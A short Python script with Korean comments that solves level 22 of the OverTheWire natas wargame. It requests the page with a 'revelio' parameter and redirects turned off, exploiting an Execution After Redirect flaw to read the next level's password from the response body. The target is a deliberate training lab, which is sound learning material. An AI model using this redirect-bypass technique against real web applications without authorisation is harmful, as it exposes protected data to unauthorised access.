import requests
import sys
import re

boundary = "=" * 65

#해당 코드 실행 실패 예외처리
if len(sys.argv) != 2:
  print(boundary)
  print("[-] 프로그램 실행시, 비밀번호를 인자로 입력해서 아래 포멧과 같이 실행해주세요")
  print(f"    python {sys.argv[0]} natas21_password")
  print(boundary)
  sys.exit(1)


url = "http://natas22.natas.labs.overthewire.org/"
natas22_cred = sys.argv[1]

s = requests.Session()
s.auth = ("natas22", natas22_cred)

# ?revelio로 요청. 서버가 302 리다이렉트를 걸어도 exit가 없어 비번이 body에 실려온다.
# allow_redirects=False로 302를 따라가지 않아야 그 body를 받을 수 있다. (Execution After Redirect)
payload = {"revelio" : ""}
response = s.get(url, params=payload, allow_redirects=False)

# 응답에 있는 상태 코드 추출
print(boundary)
print(f"응답 상태 코드 ====> {response.status_code}")
      
#정규식을 통한 비밀번호 추출
password = re.search(r"Password:\s*(\w+)", response.text)


#정규식따라 가져온 비밀번호 출력 및 실패 시, html 응답 전체 코드를 볼 수 있도록 예외 처리
if password:
    print(f"[+] natas23의 비밀번호 ====> {password.group(1)}")
    print(boundary)
else:
    print("[-] 아래 응답 html 코드에서 직접 비밀번호 확인")  
    print(response.text)
  
